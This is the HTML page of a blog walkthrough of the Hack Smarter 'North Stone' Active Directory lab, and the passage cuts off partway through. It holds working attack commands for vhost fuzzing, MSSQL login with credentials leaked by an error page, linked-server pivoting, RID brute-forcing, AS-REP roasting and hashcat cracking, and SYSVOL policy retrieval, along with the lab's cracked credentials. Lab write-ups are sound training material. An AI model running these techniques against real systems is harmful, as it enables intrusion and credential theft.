@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>North Stone | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="Hack Smarter North Stone lab: SQL error disclosure, AS-REP roasting, AD CS, scheduled DLL loading, SQL backup recovery, shadow credentials, and service control.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/north-stone.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
+    <link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
+<meta property="og:url" content="https://jennshaggy.github.io/north-stone.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="North Stone">
+<meta property="og:description" content="Hack Smarter North Stone lab: SQL error disclosure, AS-REP roasting, AD CS, scheduled DLL loading, SQL backup recovery, shadow credentials, and service control.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="North Stone">
+<meta name="twitter:description" content="Hack Smarter North Stone lab: SQL error disclosure, AS-REP roasting, AD CS, scheduled DLL loading, SQL backup recovery, shadow credentials, and service control.">
+
+
+
+
+
+<style>.north-stone-evidence{margin:2rem 0;text-align:center}.north-stone-evidence img{display:block;max-width:100%;height:auto;margin:auto;border-radius:12px}</style>
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/penetration-testing.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single technical-writeup north-stone-writeup">
+<header class="post-header"><h1 class="post-title entry-hint-parent">North Stone</h1><div class="post-description">A Hack Smarter Active Directory lab that took me from a SQL error page to domain compromise.</div></header>
+<div class="post-content">
+<h2>Objective</h2>
+<p>Hack Smarter's North Stone lab begins with VPN access and no credentials. The objective is complete domain compromise.</p>
+<h3>Initial access</h3>
+<p>Let&#x27;s set our Target IP as a variable:</p>
+<pre><code class="language-bash">tip=&lt;TARGET_IP&gt;
+echo $tip</code></pre>
+<p>Create a dedicated engagement directory, and switch into it:</p>
+<pre><code class="language-bash">mkdir NorthStone
+cd NorthStone</code></pre>
+<p>Now we&#x27;re ready to do our initial scan. We&#x27;ll have RustScan pass the ball over to Nmap once it&#x27;s done:</p>
+<pre><code class="language-bash">rustscan -a $tip -- -A</code></pre>
+<p>RustScan returns the list of open ports, which is definitely characteristic of an AD environment with some additional non-standard higher ports:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/initial-port-scan.png" alt="Initial port scan" loading="lazy"></figure>
+<p>Nmap then tells us what&#x27;s running on the open ports. The output is massive, so here are the key findings:</p>
+<p>The key findings: AD services, IIS on port 80, and SQL Server listeners on ports 1433 and 55203. Nmap also identified <code>northstone.local</code> as the domain and <code>DC.northstone.local</code> as the DC.</p>
+<h2>Finding a foothold</h2>
+<p>Our three best options to gain a foothold so far:</p>
+<ul>
+<li>SMB - Authenticating as a guest if null auth and/or guest account aren&#x27;t disabled.</li>
+<li>DNS - We&#x27;ll try a zone transfer. Even if it fails, DNS records may reveal names we can test as IIS virtual hosts.</li>
+<li>MSSQL - Ports 1433 and 55203 are both SQL Server listeners. We&#x27;ll see if they expose different instances or applications.</li>
+</ul>
+<p>We will first add the domain to our <code>/etc/hosts</code> file:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/hosts-file.png" alt="Hosts file" loading="lazy"></figure>
+<p><code>CTRL</code> + <code>O</code> to save. <code>CTRL</code> +<code>X</code> to exit.</p>
+<p>Let&#x27;s see if we can authenticate to SMB as <code>guest</code>:</p>
+<pre><code class="language-bash">nxc smb $tip -u guest -p &#x27;&#x27; --generate-hosts-file hosts</code></pre>
+<p>No such thing happening. The account is disabled.</p>
+<p>Let&#x27;s explore what lives on the actual web domain in our browser:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/coming-soon-homepage.png" alt="Coming soon homepage" loading="lazy"></figure>
+<p>As promised by Nmap, we see a &quot;Coming Soon&quot; real estate website for NorthStone...with a 69% database migration in process?</p>
+<p>I feel like that&#x27;s bad advertising for an industry that thrives on exactly that.</p>
+<p>Oh my. It gets much more detailed below the Featured Locations &amp; Property Types.</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/development-changelog.png" alt="Development changelog" loading="lazy"></figure>
+<p>This has been in progress since 2025. They may want to consider switching providers, or this is a shell corporation because it really has that vibe.</p>
+<p>Let&#x27;s check the source for any notes.</p>
+<p>Well, there&#x27;s a dev note in German that reads, &quot;All 6 in a single row.&quot;</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/german-source-comment.png" alt="German source comment" loading="lazy"></figure>
+<p>Excellent. I found dev contact information, including an @northstone.com email, in the page footer. Likely visible on the homepage, but this happens to be where I found it:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/footer-contact-source.png" alt="Footer contact source" loading="lazy"></figure>
+<pre><code class="language-md">dev@northstone.com</code></pre>
+<p>We were given a designated wordlist for this environment. Let&#x27;s use it as directed and fuzz for directories and vhosts.</p>
+<p>Directories first:</p>
+<pre><code class="language-bash">feroxbuster -u http://northstone.local -w north_stone_wordlist.txt -x php,txt,html</code></pre>
+<p>Now vhosts:</p>
+<pre><code class="language-bash">gobuster vhost -u http://northstone.local -w north_stone_wordlist.txt --append-domain</code></pre>
+<p>While those run, let&#x27;s use <code>dig</code> and see what attempting a DNS zone transfer unearths (yes, I skipped ahead):</p>
+<pre><code class="language-bash">dig @10.1.156.144 northstone.local AXFR</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/dns-zone-transfer-refused.png" alt="Dns zone transfer refused" loading="lazy"></figure>
+<p>Despite the full zone transfer being refused, it doesn’t rule out looking up individual hostnames.</p>
+<p>A zone transfer (<code>AXFR</code>) asks the DNS server for every record in <code>northstone.local</code> simultaneously. “Transfer failed” means it won’t give us the list in bulk, which is typical for an AD domain.</p>
+<p>A regular DNS query asking about one name at a time may still work, telling us the server responds to individual requests:</p>
+<pre><code class="language-bash">dig @10.1.156.144 DC.northstone.local A +short</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/dc-dns-lookup.png" alt="Dc dns lookup" loading="lazy"></figure>
+<p>And yes, it did respond. We&#x27;ve confirmed that <code>DC.northstone.local</code> resolves to the scanned host, <code>10.1.156.144</code>.</p>
+<p>What can we do with this?</p>
+<p>With <code>feroxbuster</code> and <code>gobuster</code> complete, we can use DNS to verify hostname candidates found through fuzzing or in the certificate.</p>
+<p>The vhost fuzzing returned a promising lead:</p>
+<pre><code class="language-bash">testsql.northstone.local Status: 200 [Size: 26077]</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/testsql-vhost.png" alt="Testsql vhost" loading="lazy"></figure>
+<p>Its name suggests SQL, but that could also be trickery and deceit. We know the DC exposes MSSQL.</p>
+<p>We&#x27;ll send a curl request structured to contact <code>testsql.northstone.local</code> since several site names share the <code>$tip</code>:</p>
+<pre><code class="language-bash">curl -i --resolve testsql.northstone.local:80:10.1.156.144 http://testsql.northstone.local/</code></pre>
+<p>There&#x27;s a lot to unpack in the response.</p>
+<p>First, the header:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/testsql-response-header.png" alt="Testsql response header" loading="lazy"></figure>
+<p>The best lead is the search form: <code>GET /search.aspx</code>:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/testsql-search-form.png" alt="Testsql search form" loading="lazy"></figure>
+<p>There are also two emails hiding in the output, bringing our list to three. We&#x27;ll keep these in our back pocket for later:</p>
+<pre><code class="language-md">Emails Uncovered:
+
+dev@northstone.com
+hello@northstone.com
+support@northstone.com</code></pre>
+<p>Back to our live search endpoint. In these two lines of code, the form&#x27;s action is <code>search.aspx</code>. Its method is <code>GET</code>, and it launches a <code>q</code> as a query parameter into the URL:</p>
+<pre><code class="language-xml">&lt;form action=&quot;search.aspx&quot; method=&quot;get&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;q&quot; id=&quot;searchInput&quot; ...&gt;</code></pre>
+<p>Miami is one word we know appears on the main site and <code>testsql</code>.</p>
+<p>Let&#x27;s see if and how the form responds:</p>
+<pre><code class="language-bash">curl -i --resolve testsql.northstone.local:80:10.1.156.144 &#x27;http://testsql.northstone.local/search.aspx?q=Miami&#x27;</code></pre>
+<p>I&#x27;m going to replicate the search in my browser at <code>http://testsql.northstone.local/</code> so it&#x27;s easier to take in my findings.</p>
+<p>I added <code>testsql.northstone.local</code> to <code>/etc/hosts</code> before repeating the search in my browser.</p>
+<p>Rinse and repeat the search for &quot;Miami&quot;:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/testsql-search-results.png" alt="Testsql search results" loading="lazy"></figure>
+<p>Looks like database populated results to me.</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/database-populated-search.png" alt="Database populated search" loading="lazy"></figure>
+<p>We have our <code>search.aspx</code> behavior baseline (and more).</p>
+<p>Let&#x27;s try a search for something we know won&#x27;t exist. Like $0.00. Just kidding.</p>
+<p>We&#x27;ll search <code>zzzxqv</code>, then a single quotation <code>&#x27;</code>.</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/no-results-search.png" alt="No results search" loading="lazy"></figure>
+<p>On to <code>&#x27;</code>:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/search-sql-error.png" alt="Search sql error" loading="lazy"></figure>
+<p>It&#x27;s very dramatic.</p>
+<p>Sending a single quote <code>&#x27;</code> through the search form seems to affect the SQL syntax, giving us an error page that disclosed query details, an internal file path, and DB credentials.</p>
+<p>The error page exposed:</p>
+<ol>
+<li>Exposed <code>Executed SQL Queries</code>: <code>SELECT</code> executed against the <code>Properties</code> table. It searches <code>Name</code> and <code>Location</code> with <code>LIKE</code>, and orders by <code>ID</code>. </li>
+<li>Exposed returned columns: <code>ID</code>, <code>Name</code>, <code>Price</code>, <code>Location</code>, <code>AgentName</code>, <code>AgentEmail</code>, and <code>AgentPhone</code>.</li>
+<li>Database <code>Connection String</code>: <code>Server=localhost;Database=NorthStoneDB;User Id=webapp;Password=WebPass123!;</code></li>
+</ol>
+<p>Yes, those are the credentials in that <code>Connection String</code>.</p>
+<p><strong>Harvested Credentials:</strong></p>
+<pre><code class="language-md">webapp:WebPass123!</code></pre>
+<p>We&#x27;ll try the SQL credentials against Port 1433 via <code>impacket-mssqlclient</code>:</p>
+<pre><code class="language-bash">impacket-mssqlclient &#x27;webapp:WebPass123!@10.1.156.144&#x27; -port 1433</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/webapp-sql-login.png" alt="Webapp sql login" loading="lazy"></figure>
+<p>Bam. SQL Server session achieved. We&#x27;re currently in <code>master</code>.</p>
+<p>We can&#x27;t run the usual <code>whoami</code>, <code>id</code>, <code>dir</code>, etc, but we can run their SQL equivalents:</p>
+<pre><code class="language-sql">SELECT ORIGINAL_LOGIN() AS login_name, USER_NAME() AS database_user, DB_NAME() AS current_database, @@SERVERNAME AS server_name;
+SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;) AS is_sysadmin;
+SELECT name FROM sys.databases;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/webapp-sql-permissions.png" alt="Webapp sql permissions" loading="lazy"></figure>
+<p>Nice. We&#x27;re authenticated as <code>webapp</code> on <code>DC</code> courtesy of SQL login. We can see the <code>NorthStoneDB</code> aka the application database.</p>
+<p><code>webapp</code> isn&#x27;t a member of SQL Server’s <code>sysadmin</code> server role as evidenced by <code>is_sysadmin = 0</code>. That doesn&#x27;t mean <code>webapp</code> doesn&#x27;t have useful permissions.</p>
+<p>Let&#x27;s switch to <code>NorthStoneDB</code> and enumerate further:</p>
+<pre><code class="language-sql">USE NorthStoneDB;</code></pre>
+<p>This will tell us what the app stores before opening tables:</p>
+<pre><code class="language-sql">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = &#x27;BASE TABLE&#x27;;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/northstone-database-tables.png" alt="Northstone database tables" loading="lazy"></figure>
+<p>We found <code>dbo.Properties</code> and <code>dbo.auth_test_users</code> in the database. <code>dbo.auth_test_users</code> has strong hints of AD accounts, but we need to prove it.</p>
+<p>Let&#x27;s see what <code>dbo.auth_test_users</code> looks like:</p>
+<pre><code class="language-sql">SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = &#x27;dbo&#x27; AND TABLE_NAME = &#x27;auth_test_users&#x27; ORDER BY ORDINAL_POSITION;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/auth-test-users-columns.png" alt="Auth test users columns" loading="lazy"></figure>
+<p>I believe we discovered a credentials table.</p>
+<p>Before we can officially label them AD creds, we need the table rows:</p>
+<pre><code class="language-sql">SELECT TOP (10) id, Username, PasswordValue FROM dbo.auth_test_users ORDER BY id;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/empty-auth-test-users.png" alt="Empty auth test users" loading="lazy"></figure>
+<p>Interesting. <code>auth_test_users</code> has credential-like columns, but...contains no credentials?</p>
+<p>Let&#x27;s make sure we&#x27;ve looked at this thoroughly enough. First, we&#x27;ll see if <code>webapp</code> can see rows:</p>
+<pre><code class="language-sql">SELECT COUNT(*) AS visible_rows FROM dbo.auth_test_users;</code></pre>
+<p>And we&#x27;ll run <code>sp_help</code> to see more table details:</p>
+<pre><code class="language-sql">EXEC sp_help &#x27;dbo.auth_test_users&#x27;;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/auth-test-users-table-details.png" alt="Auth test users table details" loading="lazy"></figure>
+<p>Time to move on. This table is empty, but we can test the other SQL listener on Port 55203.</p>
+<p>Exit the SQL prompt:</p>
+<pre><code class="language-sql">exit</code></pre>
+<p>Let&#x27;s see if the same credentials can access Port 55203:</p>
+<pre><code class="language-bash">impacket-mssqlclient &#x27;webapp:WebPass123!@10.1.156.144&#x27; -port 55203</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/sqlbackup-direct-login-rejected.png" alt="Sqlbackup direct login rejected" loading="lazy"></figure>
+<p>This isn&#x27;t useless information.</p>
+<p><code>webapp</code> was rejected by Port 55203, but we now know it identifies itself as <code>DC\SQLBACKUP</code>.</p>
+<p>I wonder if Port 1433 has a configured link to another SQL server. We&#x27;ll use the same <code>impacket-mssqlclient</code> command to re-authenticate to 1433, then run:</p>
+<pre><code class="language-sql">SELECT name, data_source FROM sys.servers;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/sqlbackup-linked-server.png" alt="Sqlbackup linked server" loading="lazy"></figure>
+<p>Bam. I will go ahead and call this an excellent finding. Port 1433 has a linked server named <code>SQLBACKUP</code> pointing at <code>127.0.0.1,1434</code>.</p>
+<p>Let&#x27;s see if it will spill its secrets. If the command returns a row, <code>webapp</code> can reach <code>SQLBACKUP</code>:</p>
+<pre><code class="language-sql">SELECT * FROM OPENQUERY([SQLBACKUP], &#x27;SELECT SYSTEM_USER AS login_name, DB_NAME() AS database_name, @@SERVERNAME AS server_name&#x27;);</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/linked-sqlbackup-access.png" alt="Linked sqlbackup access" loading="lazy"></figure>
+<p>Score. Using the link, <code>webapp</code> reaches <code>DC\SQLBACKUP</code>. That explains why attempting direct authentication failed. The linked connection uses a different account.</p>
+<p>I checked which databases <code>linkuser</code> could see and whether it had administrator rights.</p>
+<p>The linked connection authenticated as <code>linkuser</code>. It could see <code>NorthStoneDB_BACKUP</code>, but neither SQL account had sysadmin access.</p><figure class='north-stone-evidence'><img src='/images/north-stone/linked-sqlbackup-databases.png' alt='SQLBACKUP database list and sysadmin check' loading='lazy'></figure><p>The backup's <code>Properties</code> table held the same 36 rows as the live database. I moved on to the domain identities.</p>
+<h2>Finding domain users</h2>
+<p>I&#x27;ve been collecting all of the emails and identities unearthed along the path. Let&#x27;s make them into a formal list we can use:</p>
+<pre><code class="language-sql">SELECT DISTINCT LEFT(AgentEmail, CHARINDEX(&#x27;@&#x27;, AgentEmail) - 1) AS candidate_username FROM NorthStoneDB.dbo.Properties ORDER BY candidate_username;</code></pre>
+<p>24 email prefixes. Not bad.</p>
+<p>I saved the candidate names in <code>users.txt</code>, removed the <code>b&#x27;...&#x27;</code> wrappers, and added <code>dev</code>.</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/candidate-users-list.png" alt="Candidate users list" loading="lazy"></figure>
+<p>Now we&#x27;ll very politely ask the DC which user it recognizes:</p>
+<pre><code class="language-bash">kerbrute userenum --dc 10.1.156.144 -d northstone.local users.txt</code></pre>
+<p>No matches.</p>
+<p>Alrighty. Since none of the agents from the website validated, we need the DC to give us domain names.</p>
+<pre><code class="language-bash">nxc mssql 10.1.156.144 -u webapp -p &#x27;WebPass123!&#x27; --local-auth --rid-brute 1500</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/domain-rid-enumeration.png" alt="Domain rid enumeration" loading="lazy"></figure>
+<p>Thank you, <code>Netexec</code>.</p>
+<p>We finally have an identity list derived from the domain.</p>
+<p><strong>Updated Confirmed Findings:</strong></p>
+<ul>
+<li><strong>Confirmed SQL credential:</strong> <code>webapp:WebPass123!</code></li>
+<li><strong>Domain users:</strong> <code>c.mcgill</code>, <code>t.dalton</code>, <code>c.white</code>, <code>j.sullivan</code>, <code>m.harris</code>, <code>d.williams</code>, <code>k.bennett</code>, <code>r.parker</code>, <code>b.ward</code>, <code>e.walker</code>, <code>l.turner</code>, <code>o.scott</code></li>
+<li><strong>Service account:</strong> <code>svc_backup</code></li>
+<li><strong>Groups to track:</strong> <code>TempWinRMAccess</code>, <code>Certificate Enrollment Users</code>, <code>Software Maintainers</code>, <code>IT Support</code>, <code>IT Support Level 2</code>, <code>Print Services Operators</code>, <code>Database Backup Operators</code></li>
+<li><strong>Built-in/machine IDs:</strong> <code>Administrator</code>, <code>Guest</code>, <code>krbtgt</code>, <code>DC$</code></li>
+</ul>
+<p>Our next step is to see if any of the users have Kerberos preauthentication disabled.</p>
+<p>We&#x27;ll make a new text file with our domain users list:</p>
+<pre><code class="language-bash">printf &#x27;%s\n&#x27; svc_backup c.mcgill t.dalton c.white j.sullivan m.harris d.williams k.bennett r.parker b.ward e.walker l.turner o.scott &gt; ad-users.txt</code></pre>
+<p>And see if any have the preauth disabled:</p>
+<pre><code class="language-bash">impacket-GetNPUsers northstone.local/ -usersfile ad-users.txt -no-pass -dc-ip 10.1.156.144</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/chuck-asrep-hash.png" alt="Chuck asrep hash" loading="lazy"></figure>
+<p>This is great news.</p>
+<p><code>c.mcgill</code> (in honor of the Better Call Saul character?) doesn&#x27;t require Kerberos preauthentication.</p>
+<p>Even better, the DC returned an AS-REP hash.</p>
+<p>Let&#x27;s save a copy of that AS-REP hash offline, and get to roasting:</p>
+<pre><code class="language-bash">impacket-GetNPUsers northstone.local/ -usersfile ad-users.txt -no-pass -dc-ip 10.1.156.144 -format hashcat -outputfile asrep.hashes</code></pre>
+<p>Time to let <code>hashcat</code> and <code>rockyou</code> do some heavy lifting. Mode <code>18200</code> is for Kerberos AS-REP hashes:</p>
+<pre><code class="language-bash">hashcat -m 18200 -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt</code></pre>
+<p>Let it run. Go outside. Feel the sun. Remember what it feels like. Don&#x27;t forget to drink water. But not for long. This took maybe 1-2 minutes.</p>
+<p>Once it&#x27;s done, run this to get a more human-readable view of the cracked credentials:</p>
+<pre><code class="language-bash">hashcat -m 18200 --show asrep.hashes</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/chuck-password-recovered.png" alt="Chuck password recovered" loading="lazy"></figure>
+<p>Thank you, Chuck. Cracked credentials: <code>c.mcgill:chuck102213</code></p>
+<p>Let&#x27;s see if Chuck can authenticate via SMB:</p>
+<pre><code class="language-bash">nxc smb 10.1.156.144 -u c.mcgill -p &#x27;chuck102213&#x27; -d northstone.local</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/chuck-smb-login.png" alt="Chuck smb login" loading="lazy"></figure>
+<p>My favorite part of AD enumeration begins. In a new terminal/in your <code>NorthStone</code> directory:</p>
+<pre><code class="language-bash">bloodhound --start</code></pre>
+<p>Let&#x27;s make ourselves a ZIP we can ingest into BloodHound:</p>
+<pre><code class="language-bash">bloodhound-python -u c.mcgill -p &#x27;chuck102213&#x27; -d northstone.local -dc DC.northstone.local -ns 10.1.156.144 -c All --zip</code></pre>
+<p>BloodHound collection exposed some group relationships, but timed out on others. I checked the SMB shares and policy files before returning to AD object permissions.</p>
+<p>Let&#x27;s see where we can go from <code>C.MCGILL@NORTHSTONE.LOCAL</code>. Chuck has no Outbound Object Control, but he does have two Group memberships:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/chuck-bloodhound-groups.png" alt="Chuck bloodhound groups" loading="lazy"></figure>
+<p>And a decent Inbound Object Control list:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/chuck-inbound-control.png" alt="Chuck inbound control" loading="lazy"></figure>
+<p>Let&#x27;s see where Chuck&#x27;s Domain User&#x27;s membership can take us. We&#x27;ll click on the group <code>DOMAIN USERS@NORTHSTONE.LOCAL</code>, and look at its Outbound Object Control.</p>
+<p>No Outbound on this group. There were some timeout errors in our Bloodhound data extraction, so I don&#x27;t think we&#x27;re seeing all relationships.</p>
+<p>Alright then. Back to our terminal.</p>
+<pre><code class="language-bash">nxc smb 10.1.156.144 -u c.mcgill -p &#x27;chuck102213&#x27; -d northstone.local --shares</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/smb-share-access.png" alt="Smb share access" loading="lazy"></figure>
+<p>Chuck has <code>READ</code> access to <code>NETLOGON</code> and <code>SYSVOL</code>. Let&#x27;s see if there&#x27;s any leads in them, starting with <code>NETLOGON</code>:</p>
+<pre><code class="language-bash">smbclient //10.1.156.144/NETLOGON -U &#x27;NORTHSTONE\c.mcgill%chuck102213&#x27; -c &#x27;recurse; ls&#x27;</code></pre>
+<p>Empty. Let&#x27;s try <code>SYSVOL</code>:</p>
+<pre><code class="language-bash">smbclient //10.1.156.144/SYSVOL -U &#x27;NORTHSTONE\c.mcgill%chuck102213&#x27; -c &#x27;recurse; ls&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/sysvol-policy-listing.png" alt="Sysvol policy listing" loading="lazy"></figure>
+<figure class="north-stone-evidence"><img src="/images/north-stone/sysvol-policy-files.png" alt="Sysvol policy files" loading="lazy"></figure>
+<p>Extremely not empty. There are two policy files: <code>GptTmpl.inf</code> and <code>Registry.pol</code>.</p>
+<p>Let&#x27;s take a look:</p>
+<pre><code class="language-bash">smbclient //10.1.156.144/SYSVOL -U &#x27;NORTHSTONE\c.mcgill%chuck102213&#x27;</code></pre>
+<pre><code class="language-powershell">cd northstone.local
+cd Policies
+cd {31B2F340-016D-11D2-945F-00C04FB984F9}
+cd MACHINE
+cd Microsoft
+cd &quot;Windows NT&quot;
+cd SecEdit
+
+get GptTmpl.inf
+exit</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/gpttmpl-download.png" alt="Gpttmpl download" loading="lazy"></figure>
+<p>Success.</p>
+<p>Let&#x27;s read it:</p>
+<pre><code class="language-bash">cat GptTmpl.inf</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/gpttmpl-policy-rights.png" alt="Gpttmpl policy rights" loading="lazy"></figure>
+<p>Not worthless. These are solid policy rules for testing accounts. <code>ClearTextPassword = 0</code> means this policy does not request reversible password storage.</p>
+<p>Let&#x27;s check the other policy&#x27;s <code>GptTmpl.inf</code> for more concrete information.</p>
+<pre><code class="language-bash">smbclient //10.1.156.144/SYSVOL -U &#x27;NORTHSTONE\c.mcgill%chuck102213&#x27;</code></pre>
+<pre><code class="language-powershell">cd northstone.local
+cd Policies
+cd {6AC1786C-016F-11D2-945F-00C04fB984F9}
+cd MACHINE
+cd Microsoft
+cd &quot;Windows NT&quot;
+cd SecEdit
+get GptTmpl.inf dc-GptTmpl.inf
+exit</code></pre>
+<p>Let&#x27;s see what we recovered:</p>
+<pre><code class="language-bash">cat dc-GptTmpl.inf</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/dc-gpttmpl-policy-rights.png" alt="Dc gpttmpl policy rights" loading="lazy"></figure>
+<p>Quite a bit to sift through. Here&#x27;s our 3 most valuable findings:</p>
+<ol>
+<li><code>SeBatchLogonRight</code> includes domain RID 1110. We identified RID 1110 earlier in our enumeration as <code>c.white</code>, an account that&#x27;s allowed to run batch jobs on the DC under this policy.</li>
+<li><code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> include the Backup Operators group aka<code>S-1-5-32-551</code>. If we gain membership to that group later, those rights will come in handy because Chuck&#x27;s credentials don&#x27;t have them. </li>
